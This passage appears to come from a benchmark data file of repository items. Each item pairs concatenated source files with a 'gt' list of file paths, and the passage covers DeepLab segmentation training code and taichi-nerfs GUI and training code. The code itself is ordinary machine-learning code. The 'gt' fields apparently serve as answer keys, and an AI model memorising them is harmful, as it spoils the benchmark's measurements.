composed_transforms(sample)\n\nif __name__ == '__main__':\n    from dataloaders.utils import decode_segmap\n    from torch.utils.data import DataLoader\n    import matplotlib.pyplot as plt\n    import argparse\n\n    parser = argparse.ArgumentParser()\n    args = parser.parse_args()\n    args.base_size = 513\n    args.crop_size = 513\n\n    cityscapes_train = CityscapesSegmentation(args, split='train')\n\n    dataloader = DataLoader(cityscapes_train, batch_size=2, shuffle=True, num_workers=2)\n\n    for ii, sample in enumerate(dataloader):\n        for jj in range(sample[\"image\"].size()[0]):\n            img = sample['image'].numpy()\n            gt = sample['label'].numpy()\n            tmp = np.array(gt[jj]).astype(np.uint8)\n            segmap = decode_segmap(tmp, dataset='cityscapes')\n            img_tmp = np.transpose(img[jj], axes=[1, 2, 0])\n            img_tmp *= (0.229, 0.224, 0.225)\n            img_tmp += (0.485, 0.456, 0.406)\n            img_tmp *= 255.0\n            img_tmp = img_tmp.astype(np.uint8)\n            plt.figure()\n            plt.title('display')\n            plt.subplot(211)\n            plt.imshow(img_tmp)\n            plt.subplot(212)\n            plt.imshow(segmap)\n\n        if ii == 1:\n            break\n\n    plt.show(block=True)\n\n\n'pytorch-deeplab-xception/dataloaders/custom_transforms.py'\n:import torch\nimport random\nimport numpy as np\n\nfrom PIL import Image, ImageOps, ImageFilter\n\nclass Normalize(object):\n\n    def __init__(self, mean=(0., 0., 0.), std=(1., 1., 1.)):\n        self.mean = mean\n        self.std = std\n\n    def __call__(self, sample):\n        img = sample['image']\n        mask = sample['label']\n        img = np.array(img).astype(np.float32)\n        mask = np.array(mask).astype(np.float32)\n        img /= 255.0\n        img -= self.mean\n        img /= self.std\n\n        return {'image': img,\n                'label': mask}\n\n\nclass ToTensor(object):\n\n\n    def __call__(self, sample):\n\n\n\n        img = sample['image']\n        mask = sample['label']\n        img = np.array(img).astype(np.float32).transpose((2, 0, 1))\n        mask = np.array(mask).astype(np.float32)\n\n        img = torch.from_numpy(img).float()\n        mask = torch.from_numpy(mask).float()\n\n        return {'image': img,\n                'label': mask}\n\n\nclass RandomHorizontalFlip(object):\n    def __call__(self, sample):\n        img = sample['image']\n        mask = sample['label']\n        if random.random() < 0.5:\n            img = img.transpose(Image.FLIP_LEFT_RIGHT)\n            mask = mask.transpose(Image.FLIP_LEFT_RIGHT)\n\n        return {'image': img,\n                'label': mask}\n\n\nclass RandomRotate(object):\n    def __init__(self, degree):\n        self.degree = degree\n\n    def __call__(self, sample):\n        img = sample['image']\n        mask = sample['label']\n        rotate_degree = random.uniform(-1*self.degree, self.degree)\n        img = img.rotate(rotate_degree, Image.BILINEAR)\n        mask = mask.rotate(rotate_degree, Image.NEAREST)\n\n        return {'image': img,\n                'label': mask}\n\n\nclass RandomGaussianBlur(object):\n    def __call__(self, sample):\n        img = sample['image']\n        mask = sample['label']\n        if random.random() < 0.5:\n            img = img.filter(ImageFilter.GaussianBlur(\n                radius=random.random()))\n\n        return {'image': img,\n                'label': mask}\n\n\nclass RandomScaleCrop(object):\n    def __init__(self, base_size, crop_size, fill=0):\n        self.base_size = base_size\n        self.crop_size = crop_size\n        self.fill = fill\n\n    def __call__(self, sample):\n        img = sample['image']\n        mask = sample['label']\n\n        short_size = random.randint(int(self.base_size * 0.5), int(self.base_size * 2.0))\n        w, h = img.size\n        if h > w:\n            ow = short_size\n            oh = int(1.0 * h * ow / w)\n        else:\n            oh = short_size\n            ow = int(1.0 * w * oh / h)\n        img = img.resize((ow, oh), Image.BILINEAR)\n        mask = mask.resize((ow, oh), Image.NEAREST)\n\n        if short_size < self.crop_size:\n            padh = self.crop_size - oh if oh < self.crop_size else 0\n            padw = self.crop_size - ow if ow < self.crop_size else 0\n            img = ImageOps.expand(img, border=(0, 0, padw, padh), fill=0)\n            mask = ImageOps.expand(mask, border=(0, 0, padw, padh), fill=self.fill)\n\n        w, h = img.size\n        x1 = random.randint(0, w - self.crop_size)\n        y1 = random.randint(0, h - self.crop_size)\n        img = img.crop((x1, y1, x1 + self.crop_size, y1 + self.crop_size))\n        mask = mask.crop((x1, y1, x1 + self.crop_size, y1 + self.crop_size))\n\n        return {'image': img,\n                'label': mask}\n\n\nclass FixScaleCrop(object):\n    def __init__(self, crop_size):\n        self.crop_size = crop_size\n\n    def __call__(self, sample):\n        img = sample['image']\n        mask = sample['label']\n        w, h = img.size\n        if w > h:\n            oh = self.crop_size\n            ow = int(1.0 * w * oh / h)\n        else:\n            ow = self.crop_size\n            oh = int(1.0 * h * ow / w)\n        img = img.resize((ow, oh), Image.BILINEAR)\n        mask = mask.resize((ow, oh), Image.NEAREST)\n\n        w, h = img.size\n        x1 = int(round((w - self.crop_size) / 2.))\n        y1 = int(round((h - self.crop_size) / 2.))\n        img = img.crop((x1, y1, x1 + self.crop_size, y1 + self.crop_size))\n        mask = mask.crop((x1, y1, x1 + self.crop_size, y1 + self.crop_size))\n\n        return {'image': img,\n                'label': mask}\n\nclass FixedResize(object):\n    def __init__(self, size):\n        self.size = (size, size)\n\n    def __call__(self, sample):\n        img = sample['image']\n        mask = sample['label']\n\n        assert img.size == mask.size\n\n        img = img.resize(self.size, Image.BILINEAR)\n        mask = mask.resize(self.size, Image.NEAREST)\n\n        return {'image': img,\n                'label': mask}\n'pytorch-deeplab-xception/train.py'\n:import argparse\nimport os\nimport numpy as np\nfrom tqdm import tqdm\n\nfrom mypath import Path\nfrom dataloaders import make_data_loader\nfrom modeling.sync_batchnorm.replicate import patch_replication_callback\nfrom modeling.deeplab import *\nfrom utils.loss import SegmentationLosses\nfrom utils.calculate_weights import calculate_weigths_labels\nfrom utils.lr_scheduler import LR_Scheduler\nfrom utils.saver import Saver\nfrom utils.summaries import TensorboardSummary\nfrom utils.metrics import Evaluator\n\nclass Trainer(object):\n    def __init__(self, args):\n        self.args = args\n\n\n        self.saver = Saver(args)\n        self.saver.save_experiment_config()\n\n        self.summary = TensorboardSummary(self.saver.experiment_dir)\n        self.writer = self.summary.create_summary()\n\n\n        kwargs = {'num_workers': args.workers, 'pin_memory': True}\n        self.train_loader, self.val_loader, self.test_loader, self.nclass = make_data_loader(args, **kwargs)\n\n\n        model = DeepLab(num_classes=self.nclass,\n                        backbone=args.backbone,\n                        output_stride=args.out_stride,\n                        sync_bn=args.sync_bn,\n                        freeze_bn=args.freeze_bn)\n\n        train_params = [{'params': model.get_1x_lr_params(), 'lr': args.lr},\n                        {'params': model.get_10x_lr_params(), 'lr': args.lr * 10}]\n\n\n        optimizer = torch.optim.SGD(train_params, momentum=args.momentum,\n                                    weight_decay=args.weight_decay, nesterov=args.nesterov)\n\n\n\n        if args.use_balanced_weights:\n            classes_weights_path = os.path.join(Path.db_root_dir(args.dataset), args.dataset+'_classes_weights.npy')\n            if os.path.isfile(classes_weights_path):\n                weight = np.load(classes_weights_path)\n            else:\n                weight = calculate_weigths_labels(args.dataset, self.train_loader, self.nclass)\n            weight = torch.from_numpy(weight.astype(np.float32))\n        else:\n            weight = None\n        self.criterion = SegmentationLosses(weight=weight, cuda=args.cuda).build_loss(mode=args.loss_type)\n        self.model, self.optimizer = model, optimizer\n\n\n        self.evaluator = Evaluator(self.nclass)\n\n        self.scheduler = LR_Scheduler(args.lr_scheduler, args.lr,\n                                            args.epochs, len(self.train_loader))\n\n\n        if args.cuda:\n            self.model = torch.nn.DataParallel(self.model, device_ids=self.args.gpu_ids)\n            patch_replication_callback(self.model)\n            self.model = self.model.cuda()\n\n\n        self.best_pred = 0.0\n        if args.resume is not None:\n            if not os.path.isfile(args.resume):\n                raise RuntimeError(\"=> no checkpoint found at '{}'\" .format(args.resume))\n            checkpoint = torch.load(args.resume)\n            args.start_epoch = checkpoint['epoch']\n            if args.cuda:\n                self.model.module.load_state_dict(checkpoint['state_dict'])\n            else:\n                self.model.load_state_dict(checkpoint['state_dict'])\n            if not args.ft:\n                self.optimizer.load_state_dict(checkpoint['optimizer'])\n            self.best_pred = checkpoint['best_pred']\n            print(\"=> loaded checkpoint '{}' (epoch {})\"\n                  .format(args.resume, checkpoint['epoch']))\n\n\n        if args.ft:\n            args.start_epoch = 0\n\n    def training(self, epoch):\n        train_loss = 0.0\n        self.model.train()\n        tbar = tqdm(self.train_loader)\n        num_img_tr = len(self.train_loader)\n        for i, sample in enumerate(tbar):\n            image, target = sample['image'], sample['label']\n            if self.args.cuda:\n                image, target = image.cuda(), target.cuda()\n            self.scheduler(self.optimizer, i, epoch, self.best_pred)\n            self.optimizer.zero_grad()\n            output = self.model(image)\n            loss = self.criterion(output, target)\n            loss.backward()\n            self.optimizer.step()\n            train_loss += loss.item()\n            tbar.set_description('Train loss: %.3f' % (train_loss / (i + 1)))\n            self.writer.add_scalar('train/total_loss_iter', loss.item(), i + num_img_tr * epoch)\n\n\n            if i % (num_img_tr // 10) == 0:\n                global_step = i + num_img_tr * epoch\n                self.summary.visualize_image(self.writer, self.args.dataset, image, target, output, global_step)\n\n        self.writer.add_scalar('train/total_loss_epoch', train_loss, epoch)\n        print('[Epoch: %d, numImages: %5d]' % (epoch, i * self.args.batch_size + image.data.shape[0]))\n        print('Loss: %.3f' % train_loss)\n\n        if self.args.no_val:\n\n            is_best = False\n            self.saver.save_checkpoint({\n                'epoch': epoch + 1,\n                'state_dict': self.model.module.state_dict(),\n                'optimizer': self.optimizer.state_dict(),\n                'best_pred': self.best_pred,\n            }, is_best)\n\n\n    def validation(self, epoch):\n        self.model.eval()\n        self.evaluator.reset()\n        tbar = tqdm(self.val_loader, desc='\\r')\n        test_loss = 0.0\n        for i, sample in enumerate(tbar):\n            image, target = sample['image'], sample['label']\n            if self.args.cuda:\n                image, target = image.cuda(), target.cuda()\n            with torch.no_grad():\n                output = self.model(image)\n            loss = self.criterion(output, target)\n            test_loss += loss.item()\n            tbar.set_description('Test loss: %.3f' % (test_loss / (i + 1)))\n            pred = output.data.cpu().numpy()\n            target = target.cpu().numpy()\n            pred = np.argmax(pred, axis=1)\n\n            self.evaluator.add_batch(target, pred)\n\n\n        Acc = self.evaluator.Pixel_Accuracy()\n        Acc_class = self.evaluator.Pixel_Accuracy_Class()\n        mIoU = self.evaluator.Mean_Intersection_over_Union()\n        FWIoU = self.evaluator.Frequency_Weighted_Intersection_over_Union()\n        self.writer.add_scalar('val/total_loss_epoch', test_loss, epoch)\n        self.writer.add_scalar('val/mIoU', mIoU, epoch)\n        self.writer.add_scalar('val/Acc', Acc, epoch)\n        self.writer.add_scalar('val/Acc_class', Acc_class, epoch)\n        self.writer.add_scalar('val/fwIoU', FWIoU, epoch)\n        print('Validation:')\n        print('[Epoch: %d, numImages: %5d]' % (epoch, i * self.args.batch_size + image.data.shape[0]))\n        print(\"Acc:{}, Acc_class:{}, mIoU:{}, fwIoU: {}\".format(Acc, Acc_class, mIoU, FWIoU))\n        print('Loss: %.3f' % test_loss)\n\n        new_pred = mIoU\n        if new_pred > self.best_pred:\n            is_best = True\n            self.best_pred = new_pred\n            self.saver.save_checkpoint({\n                'epoch': epoch + 1,\n                'state_dict': self.model.module.state_dict(),\n                'optimizer': self.optimizer.state_dict(),\n                'best_pred': self.best_pred,\n            }, is_best)\n\ndef main():\n    parser = argparse.ArgumentParser(description=\"PyTorch DeeplabV3Plus Training\")\n    parser.add_argument('--backbone', type=str, default='resnet',\n                        choices=['resnet', 'xception', 'drn', 'mobilenet'],\n                        help='backbone name (default: resnet)')\n    parser.add_argument('--out-stride', type=int, default=16,\n                        help='network output stride (default: 8)')\n    parser.add_argument('--dataset', type=str, default='pascal',\n                        choices=['pascal', 'coco', 'cityscapes'],\n                        help='dataset name (default: pascal)')\n    parser.add_argument('--use-sbd', action='store_true', default=True,\n                        help='whether to use SBD dataset (default: True)')\n    parser.add_argument('--workers', type=int, default=4,\n                        metavar='N', help='dataloader threads')\n    parser.add_argument('--base-size', type=int, default=513,\n                        help='base image size')\n    parser.add_argument('--crop-size', type=int, default=513,\n                        help='crop image size')\n    parser.add_argument('--sync-bn', type=bool, default=None,\n                        help='whether to use sync bn (default: auto)')\n    parser.add_argument('--freeze-bn', type=bool, default=False,\n                        help='whether to freeze bn parameters (default: False)')\n    parser.add_argument('--loss-type', type=str, default='ce',\n                        choices=['ce', 'focal'],\n                        help='loss func type (default: ce)')\n\n    parser.add_argument('--epochs', type=int, default=None, metavar='N',\n                        help='number of epochs to train (default: auto)')\n    parser.add_argument('--start_epoch', type=int, default=0,\n                        metavar='N', help='start epochs (default:0)')\n    parser.add_argument('--batch-size', type=int, default=None,\n                        metavar='N', help='input batch size for \\\n                                training (default: auto)')\n    parser.add_argument('--test-batch-size', type=int, default=None,\n                        metavar='N', help='input batch size for \\\n                                testing (default: auto)')\n    parser.add_argument('--use-balanced-weights', action='store_true', default=False,\n                        help='whether to use balanced weights (default: False)')\n\n    parser.add_argument('--lr', type=float, default=None, metavar='LR',\n                        help='learning rate (default: auto)')\n    parser.add_argument('--lr-scheduler', type=str, default='poly',\n                        choices=['poly', 'step', 'cos'],\n                        help='lr scheduler mode: (default: poly)')\n    parser.add_argument('--momentum', type=float, default=0.9,\n                        metavar='M', help='momentum (default: 0.9)')\n    parser.add_argument('--weight-decay', type=float, default=5e-4,\n                        metavar='M', help='w-decay (default: 5e-4)')\n    parser.add_argument('--nesterov', action='store_true', default=False,\n                        help='whether use nesterov (default: False)')\n\n    parser.add_argument('--no-cuda', action='store_true', default=\n                        False, help='disables CUDA training')\n    parser.add_argument('--gpu-ids', type=str, default='0',\n                        help='use which gpu to train, must be a \\\n                        comma-separated list of integers only (default=0)')\n    parser.add_argument('--seed', type=int, default=1, metavar='S',\n                        help='random seed (default: 1)')\n\n    parser.add_argument('--resume', type=str, default=None,\n                        help='put the path to resuming file if needed')\n    parser.add_argument('--checkname', type=str, default=None,\n                        help='set the checkpoint name')\n\n    parser.add_argument('--ft', action='store_true', default=False,\n                        help='finetuning on a different dataset')\n\n    parser.add_argument('--eval-interval', type=int, default=1,\n                        help='evaluuation interval (default: 1)')\n    parser.add_argument('--no-val', action='store_true', default=False,\n                        help='skip validation during training')\n\n    args = parser.parse_args()\n    args.cuda = not args.no_cuda and torch.cuda.is_available()\n    if args.cuda:\n        try:\n            args.gpu_ids = [int(s) for s in args.gpu_ids.split(',')]\n        except ValueError:\n            raise ValueError('Argument --gpu_ids must be a comma-separated list of integers only')\n\n    if args.sync_bn is None:\n        if args.cuda and len(args.gpu_ids) > 1:\n            args.sync_bn = True\n        else:\n            args.sync_bn = False\n\n\n    if args.epochs is None:\n        epoches = {\n            'coco': 30,\n            'cityscapes': 200,\n            'pascal': 50,\n        }\n        args.epochs = epoches[args.dataset.lower()]\n\n    if args.batch_size is None:\n        args.batch_size = 4 * len(args.gpu_ids)\n\n    if args.test_batch_size is None:\n        args.test_batch_size = args.batch_size\n\n    if args.lr is None:\n        lrs = {\n            'coco': 0.1,\n            'cityscapes': 0.01,\n            'pascal': 0.007,\n        }\n        args.lr = lrs[args.dataset.lower()] / (4 * len(args.gpu_ids)) * args.batch_size\n\n\n    if args.checkname is None:\n        args.checkname = 'deeplab-'+str(args.backbone)\n    print(args)\n    torch.manual_seed(args.seed)\n    trainer = Trainer(args)\n    print('Starting Epoch:', trainer.args.start_epoch)\n    print('Total Epoches:', trainer.args.epochs)\n    for epoch in range(trainer.args.start_epoch, trainer.args.epochs):\n        trainer.training(epoch)\n        if not trainer.args.no_val and epoch % args.eval_interval == (args.eval_interval - 1):\n            trainer.validation(epoch)\n\n    trainer.writer.close()\n\nif __name__ == \"__main__\":\n   main()\n",
        "gt": [
            "'pytorch-deeplab-xception/dataloaders/custom_transforms.py'",
            "'pytorch-deeplab-xception/dataloaders/datasets/cityscapes.py'",
            "'pytorch-deeplab-xception/dataloaders/__init__.py'",
            "'pytorch-deeplab-xception/train.py'"
        ]
    },
    {
        "files": [
            "'taichi-nerfs/gui.py'",
            "'taichi-nerfs/train.py'",
            "'taichi-nerfs/datasets/nsvf.py'",
            "'taichi-nerfs/datasets/__init__.py'"
        ],
        "content": "'taichi-nerfs/gui.py'\n:import time\nimport warnings\n\nimport torch\nimport numpy as np\nimport taichi as ti\nfrom einops import rearrange\nfrom scipy.spatial.transform import Rotation as R\n\nfrom opt import get_opts\nfrom datasets import dataset_dict\nfrom datasets.ray_utils import get_ray_directions, get_rays\n\nfrom modules.networks import NGP\nfrom modules.rendering import render\nfrom modules.utils import depth2img\n\nwarnings.filterwarnings(\"ignore\")\n\n@ti.kernel\ndef write_buffer(W: ti.i32, H: ti.i32, x: ti.types.ndarray(),\n                 final_pixel: ti.template()):\n    for i, j in ti.ndrange(W, H):\n        for p in ti.static(range(3)):\n            final_pixel[i, j][p] = x[H - j, i, p]\n\n\nclass OrbitCamera:\n\n    def __init__(self, K, img_wh, poses, r):\n        self.K = K\n        self.W, self.H = img_wh\n        self.radius = r\n        self.center = np.zeros(3)\n\n        pose_np = poses.cpu().numpy()\n\n        self.rot = pose_np[0][:3, :3]\n\n        self.rotate_speed = 0.8\n        self.res_defalut = pose_np[0]\n\n    @property\n    def pose(self):\n\n        res = np.eye(4)\n        res[2, 3] -= self.radius\n\n        rot = np.eye(4)\n        rot[:3, :3] = self.rot\n        res = rot @ res\n\n        res[:3, 3] -= self.center\n        return res\n\n    def reset(self, pose=None):\n        self.rot = np.eye(3)\n        self.center = np.zeros(3)\n        self.radius = 2.0\n        if pose is not None:\n            self.rot = pose.cpu().numpy()[:3, :3]\n\n    def orbit(self, dx, dy):\n        rotvec_x = self.rot[:, 1] * np.radians(100 * self.rotate_speed * dx)\n        rotvec_y = self.rot[:, 0] * np.radians(-100 * self.rotate_speed * dy)\n        self.rot = R.from_rotvec(rotvec_y).as_matrix() @ \\\n                   R.from_rotvec(rotvec_x).as_matrix() @ \\\n                   self.rot\n\n    def scale(self, delta):\n        self.radius *= 1.1**(-delta)\n\n    def pan(self, dx, dy, dz=0):\n        self.center += 1e-4 * self.rot @ np.array([dx, dy, dz])\n\n\nclass NGPGUI:\n\n    def __init__(\n            self,\n            hparams,\n            model_config,\n            K,\n            img_wh,\n            poses,\n            radius=4.5\n        ):\n        self.hparams = hparams\n        self.model = NGP(**model_config).cuda()\n\n        print(f\"loading ckpt from: {hparams.ckpt_path}\")\n        state_dict = torch.load(hparams.ckpt_path)\n        self.model.load_state_dict(state_dict)\n\n        self.poses = poses\n\n        self.cam = OrbitCamera(K, img_wh, poses, r=radius)\n        self.W, self.H = img_wh\n        self.render_buffer = ti.Vector.field(\n            n=3,\n            dtype=float,\n            shape=(self.W, self.H)\n        )\n\n        if self.hparams.dataset_name in ['colmap', 'nerfpp']:\n            self.exp_step_factor = 1 / 256\n        else:\n            self.exp_step_factor = 0\n\n\n        self.dt = 0\n        self.mean_samples = 0\n        self.img_mode = 0\n\n    def render_cam(self):\n        t = time.time()\n        with torch.autocast(device_type='cuda', dtype=torch.float16):\n            directions = get_ray_directions(\n                self.cam.H,\n                self.cam.W,\n                self.cam.K,\n                device='cuda'\n            )\n            rays_o, rays_d = get_rays(\n                directions,\n                torch.cuda.FloatTensor(self.cam.pose)\n            )\n            results = render(\n                self.model,\n                rays_o,\n                rays_d,\n                test_time=True,\n                exp_step_factor=self.exp_step_factor,\n            )\n\n        rgb = rearrange(results[\"rgb\"], \"(h w) c -> h w c\", h=self.H)\n        depth = rearrange(results[\"depth\"], \"(h w) -> h w\", h=self.H)\n\n        self.dt = time.time() - t\n        self.mean_samples = results['total_samples'] / len(rays_o)\n\n        if self.img_mode == 0:\n            return rgb\n        assert self.img_mode == 1\n        return depth2img(depth.cpu().numpy()).astype(np.float32) / 255.0\n\n    def check_cam_rotate(self, window, last_orbit_x, last_orbit_y):\n        if window.is_pressed(ti.ui.RMB):\n            curr_mouse_x, curr_mouse_y = window.get_cursor_pos()\n            if last_orbit_x is None or last_orbit_y is None:\n                last_orbit_x, last_orbit_y = curr_mouse_x, curr_mouse_y\n            else:\n                dx = curr_mouse_x - last_orbit_x\n                dy = curr_mouse_y - last_orbit_y\n                self.cam.orbit(dx, -dy)\n                last_orbit_x, last_orbit_y = curr_mouse_x, curr_mouse_y\n        else:\n            last_orbit_x = None\n            last_orbit_y = None\n\n        return last_orbit_x, last_orbit_y\n\n    def check_key_press(self, window):\n        if window.is_pressed('w'):\n            self.cam.scale(0.2)\n        if window.is_pressed('s'):\n            self.cam.scale(-0.2)\n        if window.is_pressed('a'):\n            self.cam.pan(100, 0.)\n        if window.is_pressed('d'):\n            self.cam.pan(-100, 0.)\n        if window.is_pressed('e'):\n            self.cam.pan(0., -100)\n        if window.is_pressed('q'):\n            self.cam.pan(0., 100)\n\n    def render(self):\n\n        window = ti.ui.Window(\n            'taichi_ngp',\n            (self.W, self.H),\n        )\n        canvas = window.get_canvas()\n        gui = window.get_gui()\n\n\n        last_orbit_x = None\n        last_orbit_y = None\n\n        view_id = 0\n        last_view_id = 0\n\n        views_size = self.poses.shape[0] - 1\n\n        while window.running:\n            self.check_key_press(window)\n            last_orbit_x, last_orbit_y = self.check_cam_rotate(\n                window, last_orbit_x, last_orbit_y)\n            with gui.sub_window(\"Control\", 0.01, 0.01, 0.4, 0.2) as w:\n                self.cam.rotate_speed = w.slider_float('rotate speed',\n                                                       self.cam.rotate_speed,\n                                                       0.1, 1.)\n\n                self.img_mode = w.checkbox(\"show depth\", self.img_mode)\n\n                view_id = w.slider_int('train view', view_id, 0, views_size)\n\n                if last_view_id != view_id:\n                    last_view_id = view_id\n                    self.cam.reset(self.poses[view_id])\n\n                w.text(f'samples per rays: {self.mean_samples:.2f} s/r')\n                w.text(f'render times: {1000*self.dt:.2f} ms')\n\n            ngp_buffer = self.render_cam()\n            write_buffer(self.W, self.H, ngp_buffer, self.render_buffer)\n            canvas.set_image(self.render_buffer)\n            window.show()\n\n\nif __name__ == \"__main__\":\n    ti.init(arch=ti.cuda, device_memory_GB=4)\n\n    hparams = get_opts()\n    dataset = dataset_dict[hparams.dataset_name](\n        root_dir=hparams.root_dir,\n        downsample=hparams.downsample,\n        read_meta=True,\n    )\n\n    NGPGUI(hparams, dataset.K, dataset.img_wh, dataset.poses).render()\n\n'taichi-nerfs/train.py'\n:import glob\nimport os\nimport random\nimport time\nimport warnings\n\nimport imageio\nimport numpy as np\nimport taichi as ti\nimport torch\nimport torch.nn.functional as F\nimport tqdm\nfrom datasets.ray_utils import get_rays\nfrom einops import rearrange\nfrom gui import NGPGUI\nfrom modules.distortion import distortion_loss\nfrom modules.networks import NGP, VoxelGrid, MODEL_DICT\nfrom modules.rendering import MAX_SAMPLES, render\nfrom modules.utils import depth2img, save_deployment_model\nfrom opt import get_opts\nfrom torchmetrics import PeakSignalNoiseRatio, StructuralSimilarityIndexMeasure\n\nfrom datasets import dataset_dict\n\nwarnings.filterwarnings(\"ignore\")\n\ndef taichi_init(args):\n    taichi_init_args = {\"arch\": ti.cuda,}\n    if args.half_opt:\n        taichi_init_args[\"half2_vectorization\"] = True\n\n    ti.init(**taichi_init_args)\n\n\ndef main():\n    device = torch.device(\"cuda\" if torch.cuda.is_available() else \"cpu\")\n\n\n    seed = 23\n    random.seed(seed)\n    np.random.seed(seed)\n    torch.manual_seed(seed)\n\n    hparams = get_opts()\n    taichi_init(hparams)\n\n    if hparams.gpu != -1:\n        os.environ['CUDA_VISIBLE_DEVICES'] = str(hparams.gpu)\n\n\n    val_dir = 'results/'\n\n\n    exp_step_factor = 1 / 256 if hparams.scale > 0.5 else 0.\n\n\n    warmup_steps = 256\n    update_interval = 16\n\n\n    dataset = dataset_dict[hparams.dataset_name]\n    train_dataset = dataset(\n        root_dir=hparams.root_dir,\n        split=hparams.split,\n        downsample=hparams.downsample,\n    ).to(device)\n    train_dataset.batch_size = hparams.batch_size\n    train_dataset.ray_sampling_strategy = hparams.ray_sampling_strategy\n\n    test_dataset = dataset(\n        root_dir=hparams.root_dir,\n        split='test',\n        downsample=hparams.downsample,\n    ).to(device)\n\n\n\n\n    val_psnr = PeakSignalNoiseRatio(\n        data_range=1\n    ).to(device)\n    val_ssim = StructuralSimilarityIndexMeasure(\n        data_range=1\n    ).to(device)\n\n    model_type = hparams.model_name\n    if model_type == 'ngp':\n        if hparams.deployment:\n            model_config = {\n                'scale': hparams.scale,\n                'pos_encoder_type': 'hash',\n                'levels': 4,\n                'feature_per_level': 4,\n                'base_res': 32,\n                'max_res': 128,\n                'log2_T': 21,\n                'xyz_net_width': 16,\n                'rgb_net_width': 16,\n                'rgb_net_depth': 1,\n            }\n        else:\n            model_config = {\n                'scale': hparams.scale,\n                'pos_encoder_type': hparams.encoder_type,\n                'max_res': 1024 if hparams.scale == 0.5 else 4096,\n                'half_opt': hparams.half_opt,\n            }\n    elif model_type == 'svox':\n        model_config = {\n            'scale': hparams.scale,\n            'half_opt': hparams.half_opt,\n            'sh_degree': hparams.sh_degree,\n            'grid_size': hparams.grid_size,\n            'grid_radius': hparams.grid_radius,\n            'origin_sh': hparams.origin_sh,\n            'origin_sigma': hparams.origin_sigma\n        }\n\n\n\n    model = MODEL_DICT[model_type](**model_config).to(device)\n\n\n    if hparams.ckpt_path:\n        state_dict = torch.load(hparams.ckpt_path)\n        model.load_state_dict(state_dict)\n        print(\"Load checkpoint from %s\" % hparams.ckpt_path)\n\n    model.mark_invisible_cells(\n        train_dataset.K,\n        train_dataset.poses,\n        train_dataset.img_wh,\n    )\n\n\n\n    if hparams.half_opt:\n        scaler = 2**16\n    else:\n        scaler = 2**19\n    grad_scaler = torch.cuda.amp.GradScaler(scaler)\n\n    try:\n        import apex\n        optimizer = apex.optimizers.FusedAdam(\n            model.parameters(),\n            lr=hparams.lr,\n            eps=1e-15,\n        )\n    except ImportError:\n        print(\"Failed to import apex FusedAdam, use torch Adam instead.\")\n        optimizer = torch.optim.Adam(\n            model.parameters(),\n            hparams.lr,\n            eps=1e-15,\n        )\n\n\n    scheduler = torch.optim.lr_scheduler.CosineAnnealingLR(\n        optimizer,\n        hparams.max_steps,\n        hparams.lr/30\n    )\n\n\n\n    tic = time.time()\n    for step in range(hparams.max_steps+1):\n        model.train()\n\n        i = torch.randint(0, len(train_dataset), (1,)).item()\n        data = train_dataset[i]\n\n        direction = data['direction']\n        pose = data['pose']\n\n        with torch.autocast(device_type='cuda', dtype=torch.float16):\n            if step % update_interval == 0:\n                model.update_density_grid(\n                    0.01 * MAX_SAMPLES / 3**0.5,\n                    warmup=step < warmup_steps,\n                )\n\n            rays_o, rays_d = get_rays(direction, pose)\n\n            results = render(\n                model,\n                rays_o,\n                rays_d,\n                exp_step_factor=exp_step_factor,\n            )\n\n            loss = F.mse_loss(results['rgb'], data['rgb'])\n            if hparams.distortion_loss_w > 0:\n                loss += hparams.distortion_loss_w * distortion_loss(results).mean()\n\n        optimizer.zero_grad()\n        grad_scaler.scale(loss).backward()\n        grad_scaler.step(optimizer)\n        grad_scaler.update()\n        scheduler.step()\n\n        if step % 1000 == 0:\n            elapsed_time = time.time() - tic\n            with torch.no_grad():\n                mse = F.mse_loss(results['rgb'], data['rgb'])\n                psnr = -10.0 * torch.log(mse) / np.log(10.0)\n            print(\n                f\"elapsed_time={elapsed_time:.2f}s | \"\n                f\"step={step} | psnr={psnr:.2f} | \"\n                f\"loss={loss:.6f} | \"\n\n                f\"rays={len(data['rgb'])} | \"\n\n                f\"rm_s={results['rm_samples'] / len(data['rgb']):.1f} | \"\n\n\n                f\"vr_s={results['vr_samples'] / len(data['rgb']):.1f} | \"\n            )\n\n    if hparams.deployment:\n        save_deployment_model(\n            model=model,\n            dataset=train_dataset,\n            save_dir=hparams.deployment_model_path,\n        )\n\n\n    if not os.path.exists(val_dir):\n        os.makedirs(val_dir)\n\n    torch.save(\n        model.state_dict(),\n        os.path.join(val_dir, 'model.pth'),\n    )\n\n    progress_bar = tqdm.tqdm(total=len(test_dataset), desc=f'evaluating: ')\n    with torch.no_grad():\n        model.eval()\n        w, h = test_dataset.img_wh\n        directions = test_dataset.directions\n        test_psnrs = []\n        test_ssims = []\n        for test_step in range(len(test_dataset)):\n            progress_bar.update()\n            test_data = test_dataset[test_step]\n\n            rgb_gt = test_data['rgb']\n            poses = test_data['pose']\n\n            with torch.autocast(device_type='cuda', dtype=torch.float16):\n\n                rays_o, rays_d = get_rays(directions, poses)\n\n                results = render(\n                    model,\n                    rays_o,\n                    rays_d,\n                    test_time=True,\n                    exp_step_factor=exp_step_factor,\n                )\n\n            rgb_pred = rearrange(results['rgb'], '(h w) c -> 1 c h w', h=h)\n            rgb_gt = rearrange(rgb_gt, '(h w) c -> 1 c h w', h=h)\n\n            val_psnr(rgb_pred, rgb_gt)\n            test_psnrs.append(val_psnr.compute())\n            val_psnr.reset()\n\n            val_ssim(rgb_pred, rgb_gt)\n            test_ssims.append(val_ssim.compute())\n            val_ssim.reset()\n\n\n            if test_step == 0:\n                test_idx = test_data['img_idxs']\n\n                rgb_pred = rearrange(\n                    results['rgb'].cpu().numpy(),\n                    '(h w) c -> h w c',\n                    h=h\n                )\n                rgb_pred = (rgb_pred * 255).astype(np.uint8)\n                depth = depth2img(\n                    rearrange(results['depth'].cpu().numpy(), '(h w) -> h w', h=h))\n                imageio.imsave(\n                    os.path.join(\n                        val_dir,\n                        f'rgb_{test_idx:03d}.png'\n                        ),\n                    rgb_pred\n                )\n                imageio.imsave(\n                    os.path.join(\n                        val_dir,\n                        f'depth_{test_idx:03d}.png'\n                    ),\n                    depth\n                )\n\n        progress_bar.close()\n        test_psnr_avg = sum(test_psnrs) / len(test_psnrs)\n        test_ssim_avg = sum(test_ssims) / len(test_ssims)\n        print(f\"evaluation: psnr_avg={test_psnr_avg} | ssim_avg={test_ssim_avg}\")\n\n\n    if hparams.gui:\n        ti.reset()\n        hparams.ckpt_path = os.path.join(val_dir, 'model.pth')\n        taichi_init(hparams)\n        dataset = dataset_dict[hparams.dataset_name](\n            root_dir=hparams.root_dir,\n            